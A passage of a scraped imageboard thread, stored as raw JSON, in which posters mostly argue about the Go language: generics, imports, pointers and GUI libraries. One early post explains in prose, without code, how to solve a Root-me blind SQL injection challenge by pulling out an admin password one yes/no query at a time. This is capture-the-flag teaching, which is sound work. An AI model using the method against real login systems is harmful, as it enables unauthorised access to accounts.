onclick=\"highlightReply('15547', event);\" href=\"\/\u03bb\/res\/6019.html#15547\">&gt;&gt;15547<\/a><br\/><span class=\"quote\">&gt;Should I abandon it entirely or would you have an idea on how to use it better?<\/span><br\/><span class=\"quote\">&gt;Html, I send a login request and if the SQL request is tru then I get a \"Welcome back admin\" on the login page, otherwise it just loads the login page as normal.<\/span><br\/>It is just a plaintext response, or is the data multiple kilo-bytes? Because depending on the amount of data, it might be worth it. Remember that network transfer has a lot of latency, so a thread might spend a relatively long while just waiting, where computations (such as searching the results) could be performed. The only question then is, \"is the parallelisation overhead worth it\". In Go the answer usually is yes, because goroutines are cheap, but not always.<br\/><span class=\"quote\"> &gt;l is an int, either I convert it to string or I convert to int (used as int in the payload).<\/span><br\/>maybe consider using runes instead of ints? I believe fmt also correctly recognises their type when displaying them, while avoiding allocating space for a string (although I'm not sure if Go strings are on the heap or on the stack...).<br\/><span class=\"quote\">&gt;Isn't that good practice, especially if you want to add command line parsing in the future?<\/span><br\/>In your case, there's no advantage over placing it in the main function. Different people have different tastes, but I belong to those who see the init function as where you initialise variables you couldn't initialise either in their global definitions, or not (in a clean way) in the main function. Others disagree, and it's not wrong, just something to think about.<br\/>In your case specifically you could just as well assign <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs ebnf\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-attribute\">keyphrase<\/span> <\/code><\/pre> in it's initial definition (and group them under a single var btw). It might be more clean to define an axillary function <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs ebnf\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-attribute\">mustParseURL<\/span> <\/code><\/pre>, or something along those lines, but that's something one should think about in larger code-bases. And if you want it to be defined via flags in the future, then it's not that important anyway.","name":"Naomi Nascimento","time":1570732888,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570732888},{"no":15555,"resto":6019,"com":"<a onclick=\"highlightReply('15544', event);\" href=\"\/\u03bb\/res\/6019.html#15544\">&gt;&gt;15544<\/a><br\/>I don't understand the rules of the exercise, mind pointing me to what I'm supposed to do? I don't know what the API is, and how to determine success.<br\/><br\/>I might look into it, seems interesting.","name":"Apoc","time":1570748140,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570748140},{"no":15561,"resto":6019,"com":"<a onclick=\"highlightReply('15555', event);\" href=\"\/\u03bb\/res\/6019.html#15555\">&gt;&gt;15555<\/a><br\/>Sure, I am glad to. This is a Root-me challenge which means to interact with it you need to be logged in first. In this case you will find it under \"challenges\", \"web server\" and it is the last one of the SQLis. That is because it does not give you feedback when wrong.<br\/>Pre-work that you need to do and isn't included in the script is check the login. I believe it is written in the challenge explanation that you need to log in as admin. Of course for that you need an injection, find the right one. Once you have the username you will want the password. You know by then that the SQLi doesn't give out errors, and I gets executed nicely if you're right and \"log you in\", so you can think of it as a Boolean. You won't be able to extract the password directly, but in the form of yes\/no you can extract it. Is the length 1? Is it 2? Great, you got the length. Is the first character 'a'? Is it 'b'?<br\/>That is the gist of it. As for the API, you don't have for that challenge, so you grab the HTML and look for the hint that tells you the SQLi vent right.<br\/>I would recommend starting with the SQLis in order so you can get a feel of the different ways to inject.<br\/>Also a thing to note, that one is not realistic as nowadays most passwords databases are salted and hashed.","name":"Agent Smith","time":1570771341,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570771341},{"no":15572,"resto":6019,"com":"Is there much of a future for Go? why would\/should industrymen use it over Java or .NET or something else?<br\/><br\/>I'm wondering if I should add it to my skills and bother listing it or if it'll just be a hobby language forever. like LISP","name":"Frank Garza","time":1570826491,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570826491},{"no":15573,"resto":6019,"com":"<a onclick=\"highlightReply('15572', event);\" href=\"\/\u03bb\/res\/6019.html#15572\">&gt;&gt;15572<\/a><br\/>It's got a good neiche between server\/concurrent-systems oriented languages and doesn't need VM or interpreter + static binaries. I hear it's quite common to write critical services in Go because of it's compromise between speed and security.<br\/>Also it's compfy af to work in, no LSP needed.<br\/><span class=\"quote\">&gt;like Lisp<\/span><br\/>of of the points of learning and using lisp is to expand beyond the patterns of though in one system. as such, it's certainly worth learning as more than just a \"hobby language\". Any language that isn't a complete rip-off is woth learning for that matter. Limiting oneself to pseudo-pragmatism is much worse than trying \"save time\" not learning new ideas.","name":"Emmanuel","time":1570828130,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570828130},{"no":15574,"resto":6019,"com":"<a onclick=\"highlightReply('15572', event);\" href=\"\/\u03bb\/res\/6019.html#15572\">&gt;&gt;15572<\/a><br\/>Java and .NET are both garbage, and some of the worst programming languages known to man.<br\/>That is reason enough to use Go instead.","name":"William Holtzer","time":1570832411,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570832411},{"no":15594,"resto":6019,"com":"<a onclick=\"highlightReply('15572', event);\" href=\"\/\u03bb\/res\/6019.html#15572\">&gt;&gt;15572<\/a><br\/>Go has a very clean and consistent design compared to many other languages in the same niche (particularly services, command line utilities, and web apps). Its standard library is one of the best I've ever seen. It's a pretty easy language to learn.<br\/><br\/>Even more importantly, it's an easy language to read. You likely won't have any problem in going back to code you've written months before, or code written by others, and understanding it right away. Go sure as hell ain't Perl.<br\/><br\/>I think it's worth spending an evening to pick up the basics. You never know, it might scratch an itch for you.","name":"array","time":1570928536,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570928536},{"no":15599,"resto":6019,"com":"<span class=\"quote\">&gt;Go has a very clean and consistent design compared to many other languages in the same niche (particularly services, command line utilities, and web apps)<\/span><br\/>yeah, compared to bash, perl, python, ruby, and javascript. simply because they didn't try to add a bunch of retarded features. the language is still crap though","email":"sage","name":"Lord Nikon","time":1570979882,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570979882},{"no":15600,"resto":6019,"com":"<a onclick=\"highlightReply('15599', event);\" href=\"\/\u03bb\/res\/6019.html#15599\">&gt;&gt;15599<\/a><br\/><span class=\"quote\">&gt;the language is still crap though<\/span><br\/>What language would you consider not to be crap?","name":"Spike Spiegel","time":1570983948,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570983948},{"no":15604,"resto":6019,"com":"I'm impressed to see people defending golang in a board called \u03bb.<br\/>I checked go a few years ago, went over the tour of go and have a few questions for current users.<br\/>Are pointers and interfaces (way to ruin a type system) idiomatic go?<br\/>Was the import system fixed? iirc to import packages you had to give a github url and were only able to get the last version of the master branch or something similar<br\/>What is the intended progression of the language? Add 'modern' functional features like every other language or keep being some kind of weird garbage collected c?<br\/><br\/><a onclick=\"highlightReply('15574', event);\" href=\"\/\u03bb\/res\/6019.html#15574\">&gt;&gt;15574<\/a><br\/>.NET is not a programming language","name":"Nameless","time":1570996255,"sticky":0,"locked":0,"cyclical":"0","last_modified":1570996255},{"no":15607,"resto":6019,"com":"<a onclick=\"highlightReply('15604', event);\" href=\"\/\u03bb\/res\/6019.html#15604\">&gt;&gt;15604<\/a><br\/><span class=\"quote\">&gt;Are pointers and interfaces (way to ruin a type system) idiomatic go?<\/span><br\/>Depends on the context. <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs ebnf\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-attribute\">flag<\/span> <\/code><\/pre> uses pointers, and that's certainly idiomatic, <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs css\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-selector-tag\">io<\/span><span class=\"hljs-selector-class\">.Reader<\/span> <\/code><\/pre> and <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs css\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-selector-tag\">io<\/span><span class=\"hljs-selector-class\">.Writer<\/span> <\/code><\/pre> and omnipresent interfaces in the standard library. Interfaces like <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs gradle\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \"><span class=\"hljs-keyword\">sort<\/span>.<span class=\"hljs-keyword\">Interface<\/span> <\/code><\/pre> allow quasi-generic operations without generics. The trick is to know when to use them, and how to use them. <br\/><span class=\"quote\">&gt;Was the import system fixed? iirc to import packages you had to give a github url and were only able to get the last version of the master branch or something similar<\/span><br\/>Go 1.11 introduced a module system, but it's not uncontroversial. I haven't looked into it yet, but it's an improvement over just the latest master branch.<br\/><span class=\"quote\">&gt;What is the intended progression of the language? Add 'modern' functional features like every other language or keep being some kind of weird garbage collected c?<\/span><br\/>There are discussions towards that direction, but the Go team wants to avoid forcing concepts onto the language, that could stand in conflict with it's design goals of simplicity and cleanness. They've been discussing it for a while now: <a href=\"https:\/\/github.com\/golang\/go\/issues\/15292\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/golang\/go\/issues\/15292<\/a><br\/>They want to keep it weird, and honestly I respect that.","name":"Debbie Charteris","time":1571002765,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571002765},{"no":15619,"resto":6019,"com":"<a onclick=\"highlightReply('15607', event);\" href=\"\/\u03bb\/res\/6019.html#15607\">&gt;&gt;15607<\/a><br\/><span class=\"quote\">&gt;and omnipresent interfaces in the standard library. Interfaces like sort.Interface allow quasi-generic operations without generics.<\/span><br\/>Honestly I feel this current situation is the best compromise in golang. I've never been convinced the absolute necessity of c++ or java style generics. It's a minor code-reuse convenience, nothing more.","name":"roll","time":1571057417,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571057417},{"no":15620,"resto":6019,"com":"<a onclick=\"highlightReply('15607', event);\" href=\"\/\u03bb\/res\/6019.html#15607\">&gt;&gt;15607<\/a><br\/><span class=\"quote\">&gt;idiomatic<\/span><br\/>get with the times. it's almost 2020. the two decades of insufferable \"muh add features to language but not use it\" are over. language design is now distilled enough that any construct whatsoever is readable","name":"Lain Iwakura","time":1571067798,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571067798},{"no":15621,"resto":6019,"com":"<a onclick=\"highlightReply('15600', event);\" href=\"\/\u03bb\/res\/6019.html#15600\">&gt;&gt;15600<\/a><br\/>SML was the only good general purpose language for its era (70s-80s). after that nothing interesting or useful was created<br\/><a onclick=\"highlightReply('15607', event);\" href=\"\/\u03bb\/res\/6019.html#15607\">&gt;&gt;15607<\/a><br\/>casting is a catastrophe in Go btw. i don't see how they managed to make it worse than Java\/C# (before they got generics)<br\/><span class=\"quote\">&gt;They want to keep it weird, and honestly I respect that.<\/span><br\/>There's nothing remotely novel in Go. Invalid concepts like having web URLs as imports don't count.","name":"Jim Hilger","time":1571069321,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571069321,"tn_h":150,"tn_w":200,"h":768,"w":1024,"fsize":24790,"filename":"sml","ext":".png","tim":"1571069321580","md5":"7YSBq6vHFFN\/Pm41CePuqw=="},{"no":15623,"resto":6019,"com":"<a onclick=\"highlightReply('15621', event);\" href=\"\/\u03bb\/res\/6019.html#15621\">&gt;&gt;15621<\/a><br\/><span class=\"spoiler\">oh look, it's that nedit guy who's too good for normal software<\/span><br\/><span class=\"quote\">&gt;There's nothing remotely novel in Go.<\/span><br\/>That's not their point. They are not a new language, but a rearticulated one. It's stdlib makes it what it is, and if it wern't as attractive, I don't think I would have much interest in the language either.","email":"sage","name":"Vasya Pupkin","time":1571069676,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571069676},{"no":15625,"resto":6019,"com":"<a onclick=\"highlightReply('15623', event);\" href=\"\/\u03bb\/res\/6019.html#15623\">&gt;&gt;15623<\/a><br\/>well they didnt solve any known problem either<br\/>half the go users think they are being humble by not solving any problems, while still using a complex piece of junk language that Go is<br\/><span class=\"quote\">&gt;It's stdlib makes it what it is<\/span><br\/>you mean a bunch of wrappers around POSIX crap? some smartass bloated datastructures lib?<br\/>i havent touched the standard lib of any language for years and you shouldnt either","name":"Acid Burn","time":1571071204,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571071204},{"no":15633,"resto":6019,"com":"<a onclick=\"highlightReply('15621', event);\" href=\"\/\u03bb\/res\/6019.html#15621\">&gt;&gt;15621<\/a><br\/>I almost fell for your trolling. Nice work! Top marks.","name":"Colmerauer","time":1571084536,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571084536},{"no":15635,"resto":6019,"com":"I really don't understand people's obsession with generics.<br\/>In my 6 years in the industry and 6 years in school, I've never once used Generics. I learned programming from a C (and then later C++) background and did very little Java\/C#, and in neither case did I use their languages generics. The closest thing I've gotten to generics are C++ and C#'s auto types but I haven't used C# in years because it's a garbage language tied to a garbage platform.<br\/><br\/>Why do Generics exist anyways? I don't understand the argument for their existence. I have seen plenty of times where I've reused code in Go, and every time I want to implement some kind of generic interface interface{} and encoding\/json (casting a struct into another typed struct ala adapters) meet my needs.","name":"Hagbard Celine","time":1571090325,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571090325},{"no":15636,"resto":6019,"com":"<a onclick=\"highlightReply('15635', event);\" href=\"\/\u03bb\/res\/6019.html#15635\">&gt;&gt;15635<\/a><br\/>I think there's a laziness aspect to the complaints, particularly from some people in the Java community. A relatively new language has come along that works very well in Java's traditional problem domains, while significantly outperforming it in certain aspects. But there's a huge group of programmers who have really only ever used Java in their professional careers. Some of them are rather set in their ways, unwilling to learn how a new language operates. Hence, the complaints when the new language isn't 100% identical to the old one.<br\/><br\/>Personally I'm in love with Go. There's something exciting about a clean-slate language that's not burdened with the cruft of the old.","name":"Crazy Jake","time":1571096616,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571096616},{"no":15637,"resto":6019,"com":"<a onclick=\"highlightReply('15636', event);\" href=\"\/\u03bb\/res\/6019.html#15636\">&gt;&gt;15636<\/a><br\/>In my experience Java programmers seem to get very angry whenever anyone talks bad about their langauge. It's so strange, as a C\/Python\/Go programmer I rarely have anyone say anything negative about my langauges except for Go, and usually nobody can give me decent answers to why they dislike the languages, despite the fact that I am really good at explaining why Java is such a bad language (bloated, writing idiomatic java is very convoluted, how it uses design patterns is out of the 90s, ect.).","name":"Cowboy","time":1571098019,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571098019},{"no":15638,"resto":6019,"com":"<a onclick=\"highlightReply('15635', event);\" href=\"\/\u03bb\/res\/6019.html#15635\">&gt;&gt;15635<\/a><br\/>they're for containers, mostly. do you write container objects\/classes? if not, there are far fewer cases where you will use generics.","name":"Debbie Charteris","time":1571099424,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571099424},{"no":15640,"resto":6019,"com":"<a onclick=\"highlightReply('15638', event);\" href=\"\/\u03bb\/res\/6019.html#15638\">&gt;&gt;15638<\/a><br\/>Why not just use arrays of bytes or strings to store data, they are much more effective then creating abstract data types. One of go's strengths is that it can store structures (as long as they don't have references) as json, Python has Dictionaries and Sets which do very much the same thing, and both C and C++ has void typing (and character\/byte arrays).<br\/>These can all be used to create an abstract data model way better than generics.","name":"Judge Fang","time":1571101557,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571101557},{"no":15641,"resto":6019,"com":"<a onclick=\"highlightReply('15640', event);\" href=\"\/\u03bb\/res\/6019.html#15640\">&gt;&gt;15640<\/a><br\/>because dynamic typing is trash","name":"Project 2501","time":1571106461,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571106461},{"no":15643,"resto":6019,"com":"<a onclick=\"highlightReply('15635', event);\" href=\"\/\u03bb\/res\/6019.html#15635\">&gt;&gt;15635<\/a><br\/>People are \"obsessing\" over it, because when you've used languages with generics, it's a thing you really realize that would be really nice to have in Go too.<br\/><span class=\"quote\">&gt;Why do Generics exist anyways? I don't understand the argument for their existence.<\/span><br\/>To ensure type-safety behind complex systems. Take sync.Map for example. Currently it's from interface{} to interface{}, while the regular map is quasi-generic. And sync.Map certainly isn't a structure I'd like to re-implement each time I want to use it. That means that all the users have to ensure that they are using the right types, checking after converting, etc. All it takes is someone to confuse the Stringer interface and the primitive string type and in the worse case a program could panic. Generics would allow, just as they do with regular maps, that these kinds of automatically catchable mistakes could be recognised by a compiler, statically, thus ensuring type safety.","name":"Cat Mother","time":1571120395,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571120395},{"no":15700,"resto":6019,"com":"<a onclick=\"highlightReply('15604', event);\" href=\"\/\u03bb\/res\/6019.html#15604\">&gt;&gt;15604<\/a><br\/><span class=\"quote\">&gt;Was the import system fixed? iirc to import packages you had to give a github url<\/span><br\/><br\/>Actually, no. If you saw something like:<br\/><br\/><pre><code class=\"hljs swift\"><span class=\"hljs-keyword\">import<\/span> (<br\/>    <span class=\"hljs-string\">\"github.com\/username\/somecodebase\"<\/span><br\/>) <\/code><\/pre><br\/>...that's not actually referring to a URL. That's referring to a path on local storage under $GOPATH\/src\/ . For example, if $GOPATH is \"\/home\/bobsmith\/Source\/golang\", then that import in the above example is referring to locally-stored directory \"\/home\/bobsmith\/Source\/golang\/src\/github.com\/username\/somecodebase\". It's just typically stored that way so that one can easily have the URL of the package at a glance if one needs it. It's not at all required to be in the form of a URL. It could easily be under \"\/home\/bobsmith\/Source\/golang\/src\/somecodebase\" and imported with:<br\/><br\/><pre><code class=\"hljs swift\"><span class=\"hljs-keyword\">import<\/span> (<br\/>    <span class=\"hljs-string\">\"somecodebase\"<\/span><br\/>) <\/code><\/pre><br\/>...with zero change in real functionality and no other changes required in code that depends on that package.<br\/><br\/>While it's true that under the $GOPATH method all projects on one's own machine build against the same version of a package stored in $GOPATH\/src, it's NOT true (and never has been true) that that package is somehow forced to be updated locally when the upstream package changes.<br\/><br\/>The new module system is changing that further, allowing specific projects to build against specific versions of a package. The language itself is ready, but it'll take some time for third-party tooling to handle it properly.","name":"Unidentified","time":1571686709,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571686709},{"no":15701,"resto":6019,"com":"<a onclick=\"highlightReply('15633', event);\" href=\"\/\u03bb\/res\/6019.html#15633\">&gt;&gt;15633<\/a><br\/>not an argument<br\/><a onclick=\"highlightReply('15640', event);\" href=\"\/\u03bb\/res\/6019.html#15640\">&gt;&gt;15640<\/a><br\/>having JSON as something other than a 3rd party library is a horrible idea. JSON is underspecified and uderpowered. literally nothing was ever even good about it other than being a less soykaf alternative to XML. i can't remember how that stuff works in Go (through tags or something), but it isn't a game changer. algebraic data types are the state of the art right now. anything less is crap","name":"nil","time":1571694878,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571694878},{"no":15702,"resto":6019,"com":"<a onclick=\"highlightReply('15700', event);\" href=\"\/\u03bb\/res\/6019.html#15700\">&gt;&gt;15700<\/a><br\/>Keep in mind that you can have multiple GOPATH just like you can have multiple PATH, and that you can have local packages. Packages do NOT need to come from github, and do not need to adhere to that specific import syntax. Go Imports are just arbitrary directories that have .go files.","name":"Haruyoshi","time":1571695454,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571695454},{"no":15703,"resto":6019,"com":"<a onclick=\"highlightReply('15702', event);\" href=\"\/\u03bb\/res\/6019.html#15702\">&gt;&gt;15702<\/a><br\/>Quite true. I could have phrased my post to make that more clear. I just wanted to dispel any misapprehension that Go somehow specifically requires Github for third-party packages.","name":"Elliot Alderson","time":1571702673,"sticky":0,"locked":0,"cyclical":"0","last_modified":1571702673},{"no":16189,"resto":6019,"com":"<a onclick=\"highlightReply('8644', event);\" href=\"\/\u03bb\/res\/6019.html#8644\">&gt;&gt;8644<\/a><br\/><span class=\"quote\">&gt;but Rust and Go have different use cases<\/span><br\/>This is honestly what got me into Go. I had a \"why bother\" attitude until I realised that these languages solve different problems and are no competition to each other. Go is remarkable whenever concurrency is involved and it is a nice replacement for simple interpreted languages whenever you need a compiled language. I really like Go's simplicity; my experience with the language so far was quite pleasant.","name":"The Fin","time":1575961132,"sticky":0,"locked":0,"cyclical":"0","last_modified":1575961132},{"no":16197,"resto":6019,"com":"<a onclick=\"highlightReply('16189', event);\" href=\"\/\u03bb\/res\/6019.html#16189\">&gt;&gt;16189<\/a><br\/>I think that while neither Rust nor Go on their own are replacements for C, the Rust\/Go combo has the potential to be after another few years of polishing for each. Personally I'm most eager for Gio (<a href=\"https:\/\/git.sr.ht\/~eliasnaur\/gio\" rel=\"nofollow\" target=\"_blank\">https:\/\/git.sr.ht\/~eliasnaur\/gio<\/a>), a native cross-platform Go graphics library. It's still under early development but it's looking really good. I'd love to ditch that go-astilectron insanity that I currently have to use to write portable desktop Go apps.","name":"aliased","time":1576009817,"sticky":0,"locked":0,"cyclical":"0","last_modified":1576009817},{"no":16238,"resto":6019,"com":"<a onclick=\"highlightReply('16197', event);\" href=\"\/\u03bb\/res\/6019.html#16197\">&gt;&gt;16197<\/a><br\/>I only have one issue with golang and that's building a dll with a custom DllMain.<br\/>I get why, as the runtime needs to initialize, and there <em>is<\/em> this project <a href=\"https:\/\/github.com\/NaniteFactory\/dllmain\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/NaniteFactory\/dllmain<\/a>, but I wish there was a way to add to DllMain after the runtime is setup.<br\/><br\/>Am I missing something with building using a DLL with c-shared?","name":"Bob Arctor","time":1576472225,"sticky":0,"locked":0,"cyclical":"0","last_modified":1576472225},{"no":18890,"resto":6019,"com":"I have a question, why do pointers to struct types work like this?<br\/><br\/><pre><code class=\"hljs vim\"><span class=\"hljs-built_in\">type<\/span> Feed struct {<br\/>\t\tID <span class=\"hljs-built_in\">string<\/span> `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"id\"<\/span>`<br\/>\t\tTitle <span class=\"hljs-built_in\">string<\/span> `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"title\"<\/span>`<br\/>\t\tLink <span class=\"hljs-built_in\">string<\/span> `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"link\"<\/span>`<br\/>\t\tDescription <span class=\"hljs-built_in\">string<\/span> `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"description\"<\/span>`<br\/>\t\tEntry []Entry `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"entry\"<\/span>`<br\/>\t\tUpdated time.Time `<span class=\"hljs-keyword\">xm<\/span><span class=\"hljs-variable\">l:<\/span><span class=\"hljs-string\">\"updated\"<\/span>`<br\/>}<br\/><br\/>var feed *Feed = getFeed(someUrl)<br\/>fmt.printLn(feed.Link) \/\/ <span class=\"hljs-keyword\">all<\/span> good<br\/><br\/>num := <span class=\"hljs-number\">10<\/span><br\/>numPtr := &amp;num<br\/>fmt.printLn(*numPtr) \/\/ <span class=\"hljs-keyword\">all<\/span> good, prints <span class=\"hljs-number\">10<\/span> <\/code><\/pre><br\/>why don't I need to deference my struct type but I do need to deference the number pointer?","name":"array","time":1590774470,"sticky":0,"locked":0,"cyclical":"0","last_modified":1590774470},{"no":19233,"resto":6019,"com":"<a onclick=\"highlightReply('16197', event);\" href=\"\/\u03bb\/res\/6019.html#16197\">&gt;&gt;16197<\/a><br\/>Other anon here to inform that Gio is becoming more mature. It can already target desktop and mobile.<br\/>In case someone is not aware the main dev is an absolute qt chad bf.","name":"HELIOS","time":1592315938,"sticky":0,"locked":0,"cyclical":"0","last_modified":1592315938},{"no":19240,"resto":6019,"com":"<a onclick=\"highlightReply('18890', event);\" href=\"\/\u03bb\/res\/6019.html#18890\">&gt;&gt;18890<\/a><br\/>Go has automatic dereferencing in certain cases, one of those cases is accessing a field.<br\/>See <a href=\"https:\/\/stackoverflow.com\/questions\/13533681\/when-do-gos-pointers-dereference-themselves\" rel=\"nofollow\" target=\"_blank\">https:\/\/stackoverflow.com\/questions\/13533681\/when-do-gos-pointers-dereference-themselves<\/a>","name":"Lady Jessica","time":1592319019,"sticky":0,"locked":0,"cyclical":"0","last_modified":1592319019},{"no":19249,"resto":6019,"com":"<a onclick=\"highlightReply('19233', event);\" href=\"\/\u03bb\/res\/6019.html#19233\">&gt;&gt;19233<\/a><br\/>Nice! Thanks for the update.<br\/><br\/>Fyne (<a href=\"https:\/\/fyne.io\/\" rel=\"nofollow\" target=\"_blank\">https:\/\/fyne.io\/<\/a>) is another one that's interesting. It's not quite as low-level as Gio, but it might scratch someone's itch if they're looking for a relatively simple way to get Go GUI programs running.","name":"Masami Eiri","time":1592355028,"sticky":0,"locked":0,"cyclical":"0","last_modified":1592355028},{"no":19301,"resto":6019,"com":"<a onclick=\"highlightReply('19240', event);\" href=\"\/\u03bb\/res\/6019.html#19240\">&gt;&gt;19240<\/a><br\/>huh, that sounds really useful, does it bite you in the ass in some weird situations?","name":"SHODAN","time":1592586978,"sticky":0,"locked":0,"cyclical":"0","last_modified":1592586978},{"no":19900,"resto":6019,"com":"what is go good for?","name":"drop","time":1596505236,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596505236},{"no":19903,"resto":6019,"com":"<a onclick=\"highlightReply('19900', event);\" href=\"\/\u03bb\/res\/6019.html#19900\">&gt;&gt;19900<\/a><br\/>Go is a pretty good general-purpose language (if you're not looking for easy native desktop GUIs, see below). It's statically-typed, compiled, and garbage-collected. It's good for commandline stuff, great for web backends, and fantastic for server daemons. (Goroutines are <em>the bomb<\/em>.)<br\/><br\/>Basically, about ten+ years ago a lot of the guys who first developed C decided to create a new C-ish language that takes advantage of modern hardware features like multicore CPUs. Some people complain that Go doesn't have any exciting new concepts, but that's kinda the point. It's designed to be a stable language with new features added slowly and carefully.<br\/><br\/>Go's one real disadvantage is the lack of a mature GUI framework, but as other posts in this thread show, there's been some solid development in that area. Another year or so of polish on Gio and Fyne, and Go will be a good choice for GUI development too.","name":"Spooky","time":1596508563,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596508563},{"no":19905,"resto":6019,"com":"<a onclick=\"highlightReply('19903', event);\" href=\"\/\u03bb\/res\/6019.html#19903\">&gt;&gt;19903<\/a><br\/>I'd be a lot more interested in Go if not for the rakes-to-the-face-in-a-darkened-shed that are compile errors on unused vars. Commenting things out during writing\/debugging is an extremely common workflow.<br\/><br\/>That said, the lexer is open source too, and it's fairly easy to recompile (it's self-bootstrapping) and remove that idiocy. Any IDE will still whine about them, which will stop you from releasing something in that state, but your program will at least run.","name":"roll","time":1596512390,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596512390},{"no":19907,"resto":6019,"com":"<a onclick=\"highlightReply('19905', event);\" href=\"\/\u03bb\/res\/6019.html#19905\">&gt;&gt;19905<\/a><br\/>I suppose it's all a matter of personal preference. I don't mind unused-variable warnings. It helps me keep my code reasonably tidy.","name":"roll","time":1596513166,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596513166},{"no":19908,"resto":6019,"com":"<a onclick=\"highlightReply('19903', event);\" href=\"\/\u03bb\/res\/6019.html#19903\">&gt;&gt;19903<\/a><br\/><span class=\"quote\">&gt;Go's one real disadvantage<\/span><br\/>Don't forget the lack of generics, compile-time introspection, and generally anything that allows the programmer to write less code.","email":"sage","name":"Joey","time":1596517745,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596517745},{"no":19910,"resto":6019,"com":"<a onclick=\"highlightReply('19907', event);\" href=\"\/\u03bb\/res\/6019.html#19907\">&gt;&gt;19907<\/a><br\/>ERRORS, not warnings. Unused variables will cause a compile to fail and your program to not run.","name":"William Holtzer","time":1596519790,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596519790},{"no":19920,"resto":6019,"com":"<a onclick=\"highlightReply('19908', event);\" href=\"\/\u03bb\/res\/6019.html#19908\">&gt;&gt;19908<\/a><br\/>If you want C++, you know where you can get it.","name":"swap","time":1596543849,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596543849},{"no":19927,"resto":6019,"com":"<a onclick=\"highlightReply('19903', event);\" href=\"\/\u03bb\/res\/6019.html#19903\">&gt;&gt;19903<\/a><br\/>should i learn to as my first language?","name":"Morpheus","time":1596553778,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596553778},{"no":19928,"resto":6019,"com":"<a onclick=\"highlightReply('6019', event);\" href=\"\/\u03bb\/res\/6019.html#6019\">&gt;&gt;6019<\/a><br\/>No offense for go users, but what's the point of this language? I feel every other language have some sort of feature that's pretty exclusive for them.<br\/>C - low level<br\/>Lisp - macros<br\/>Rust - type safe, low level, functional<br\/>Haskell - pure functional<br\/>etc. etc.","name":"Judge Fang","time":1596571384,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596571384},{"no":19931,"resto":6019,"com":"<a onclick=\"highlightReply('19927', event);\" href=\"\/\u03bb\/res\/6019.html#19927\">&gt;&gt;19927<\/a><br\/>It's not a bad choice. Of course one should try a variety of languages, no language is perfect. But yeah, give it shot. I think it's a really fun and practical language (much like Python). There's a great website (<a href=\"https:\/\/tour.golang.org\/welcome\/1\" rel=\"nofollow\" target=\"_blank\">https:\/\/tour.golang.org\/welcome\/1<\/a>) that gives you an easy interactive intro into it.<br\/><br\/><a onclick=\"highlightReply('19928', event);\" href=\"\/\u03bb\/res\/6019.html#19928\">&gt;&gt;19928<\/a><br\/>Go combines a lot of good features of other languages into one, wraps it in a syntax with a shallow learning curve, includes garbage collection with a negligible performance hit, outputs portable static binaries, gives you easy and reliable multithreading (technically not multithreading under the hood, but it's this is practice) for free, has <em>super<\/em>-fast compile times, and provides a massive standard library that works in a self-consistent way.<br\/><br\/>Practically anyone can pick up the language and be writing useful production-ready code within a week. And even more importantly, since there's exactly one enforced brace style and there's a limited number of keywords, it's easy to read an unfamiliar 